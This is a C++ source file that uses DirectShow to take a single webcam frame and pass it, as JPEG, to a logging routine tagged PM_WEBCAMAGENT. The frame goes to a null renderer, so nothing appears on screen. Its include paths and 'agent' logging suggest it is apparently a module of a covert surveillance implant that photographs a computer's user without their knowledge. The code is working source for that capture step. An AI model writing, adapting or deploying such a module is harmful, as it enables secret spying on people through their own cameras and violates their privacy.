#include <dshow.h>
#include "qedit.h"
#include "../../H4DLL/common.h"
#include "../../H4DLL/LOG.h"

#define CAM_COMPLETION_WAIT 1000 //Numero di millisecondi per ricevere il primo frame

#define CHECK_RESULT(x) if (!x) break;
#define CHECK_HRESULT(x) if( FAILED(x) ) break;
#define SAFE_RELEASE(x) if (x) {x->Release(); x=NULL;}

// Definita in BitmapCommon
extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);

static void FreeMediaType(AM_MEDIA_TYPE& mt)
{
    if (mt.cbFormat != 0)
	{
        CoTaskMemFree((PVOID)mt.pbFormat);
        mt.cbFormat = 0;
        mt.pbFormat = NULL;
    }
    if (mt.pUnk != NULL)
	{
        // pUnk should not be used.
        mt.pUnk->Release();
        mt.pUnk = NULL;
    }
}

static void DeleteMediaType(AM_MEDIA_TYPE *pmt)
{
    if (pmt != NULL) {
        FreeMediaType(*pmt); 
        CoTaskMemFree(pmt);
    }
}

// Scrive l'immagine
static void WriteCamBitmap(BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
{
	BmpToJpgLog(PM_WEBCAMAGENT, NULL, 0, pBMI, cbBMI, pData, cbData, quality);
}

void GetDefaultCapDevice(IBaseFilter **ppCap)
{
	HRESULT hr;
	ICreateDevEnum	*pCreateDevEnum = NULL;
	IEnumMoniker	*pEm = NULL;

	do {
		*ppCap = NULL;

		// Create an enumerator
		hr = CoCreateInstance(	CLSID_SystemDeviceEnum,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_ICreateDevEnum,
								(LPVOID *)&pCreateDevEnum);
		CHECK_HRESULT(hr);
		
		// Enumerate video capture devices
		hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
		if (hr != S_OK)
			break;
		pEm->Reset();

		// Go through and find first capture device
		//
		while(true) {
			ULONG ulFetched = 0;
			IMoniker *pM;

			pM = NULL;
			hr = pEm->Next(1, &pM, &ulFetched);
			if(hr != S_OK)
				break;

			// Ask for the actual filter
			hr = pM->BindToObject(NULL, NULL, IID_IBaseFilter, (void **)ppCap);
			SAFE_RELEASE(pM);
			if(*ppCap)
				break;
		}
	} while (0);

	SAFE_RELEASE(pCreateDevEnum);
	SAFE_RELEASE(pEm);
}

void CameraGrab(DWORD quality)
{
	HRESULT hr;
	long evCode;
	long cbBuffer;
	AM_MEDIA_TYPE mt; 

	BYTE					*pBuffer = NULL;
	ICaptureGraphBuilder2	*pCaptureGraphBuilder = NULL;
	IGraphBuilder			*pGraph = NULL;
	IMediaControl			*pMediaControl = NULL;
	IBaseFilter				*pVideoCapture = NULL;
	IBaseFilter				*pImageSinkBase = NULL;
	IBaseFilter				*pGrabberF = NULL;
    ISampleGrabber			*pGrabber = NULL;
	IBaseFilter				*pNullF = NULL;
	IMediaEventEx			*pEvent = NULL;
	IEnumPins				*pEnum = NULL;
	IPin					*pPin = NULL;

	if (CoInitialize(NULL) != S_OK)
	{
		return;
	}

	do {
		// crea il filtergraph manager
		hr = CoCreateInstance(	CLSID_FilterGraph,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_IGraphBuilder,
								(LPVOID *)&pGraph);
		CHECK_HRESULT(hr);

		// crea il capture graph builder
		hr = CoCreateInstance(	CLSID_CaptureGraphBuilder2,
								NULL,
								CLSCTX_INPROC_SERVER,
								IID_ICaptureGraphBuilder2,
								(LPVOID *)&pCaptureGraphBuilder );
		CHECK_HRESULT(hr);

		// seleziona il filtergraph da usare
		hr = pCaptureGraphBuilder->SetFiltergraph(pGraph);
		CHECK_HRESULT(hr);

		// Media Control
		hr = pGraph->QueryInterface(IID_PPV_ARGS(&pMediaControl));
		CHECK_HRESULT(hr);
		hr = pGraph->QueryInterface(IID_PPV_ARGS(&pEvent));
		CHECK_HRESULT(hr);

		// Aggiunge il device di cattura al grafo
		GetDefaultCapDevice(&pVideoCapture);
		CHECK_RESULT(pVideoCapture);
		hr = pVideoCapture->EnumPins(&pEnum);
		CHECK_HRESULT(hr);
		while (pEnum->Next(1, &pPin, NULL) == S_OK) {
			PIN_DIRECTION pindir = (PIN_DIRECTION)3;
			pPin->QueryDirection(&pindir);
			if (pindir != PINDIR_OUTPUT) {
				SAFE_RELEASE(pPin);
				continue;
			}
			break;
		}
		CHECK_RESULT(pPin);

		hr = pGraph->AddFilter(pVideoCapture, L"Video Capture Source");
		CHECK_HRESULT(hr);

		// Crea il Sample Grabber filter.
		hr = CoCreateInstance(	CLSID_SampleGrabber, 
								NULL, 
								CLSCTX_INPROC_SERVER,
								IID_PPV_ARGS(&pGrabber));
		CHECK_HRESULT(hr);
		hr = pGrabber->QueryInterface(IID_PPV_ARGS(&pGrabberF));
		CHECK_HRESULT(hr);
		hr = pGraph->AddFilter(pGrabberF, L"Sample Grabber");
		CHECK_HRESULT(hr);

		ZeroMemory(&mt, sizeof(mt));
		mt.majortype = MEDIATYPE_Video;
		mt.subtype = MEDIASUBTYPE_RGB24;
		hr = pGrabber->SetMediaType(&mt);
		FreeMediaType(mt);
		CHECK_HRESULT(hr);

		// Aggiunge il filtro nullo
		hr = CoCreateInstance(	CLSID_NullRenderer, 
								NULL, 
								CLSCTX_INPROC_SERVER, 
								IID_PPV_ARGS(&pNullF));
		CHECK_HRESULT(hr);
		hr = pGraph->AddFilter(pNullF, L"Null Filter");
		CHECK_HRESULT(hr);

		hr = pCaptureGraphBuilder->RenderStream(NULL, 
												NULL, 
												pPin,
												pGrabberF,
												pNullF);
		CHECK_HRESULT(hr);

		hr = pGrabber->SetBufferSamples(TRUE);
		CHECK_HRESULT(hr);

		hr = pMediaControl->Run();
		CHECK_HRESULT(hr);
		
		hr = pEvent->WaitForCompletion(CAM_COMPLETION_WAIT, &evCode);
		Sleep(CAM_COMPLETION_WAIT);
		hr = pMediaControl->Stop();
		CHECK_HRESULT(hr);

		// Alloca il buffer per l'immagine
		hr = pGrabber->GetCurrentBuffer(&cbBuffer, NULL);
		pBuffer = (BYTE*)CoTaskMemAlloc(cbBuffer);
		CHECK_RESULT(pBuffer);
		hr = pGrabber->GetCurrentBuffer(&cbBuffer, (long*)pBuffer);
		CHECK_HRESULT(hr);

		hr = pGrabber->GetConnectedMediaType(&mt);
		CHECK_HRESULT(hr);

		// Examine the format block.
		if ((mt.formattype == FORMAT_VideoInfo) && 
			(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
			(mt.pbFormat != NULL)) {
			VIDEOINFOHEADER *pVih = (VIDEOINFOHEADER*)mt.pbFormat;
			WriteCamBitmap(&pVih->bmiHeader, mt.cbFormat - SIZE_PREHEADER, pBuffer, cbBuffer, quality);
		}
		FreeMediaType(mt);

	} while(0);
	if (pBuffer)
		CoTaskMemFree(pBuffer);
	SAFE_RELEASE(pCaptureGraphBuilder);
	SAFE_RELEASE(pGraph);
	SAFE_RELEASE(pEnum);
	SAFE_RELEASE(pPin);
	SAFE_RELEASE(pMediaControl);
	SAFE_RELEASE(pVideoCapture);
	SAFE_RELEASE(pImageSinkBase);
	SAFE_RELEASE(pGrabberF);
    SAFE_RELEASE(pGrabber);
	SAFE_RELEASE(pNullF);
	SAFE_RELEASE(pEvent);

	CoUninitialize();
}


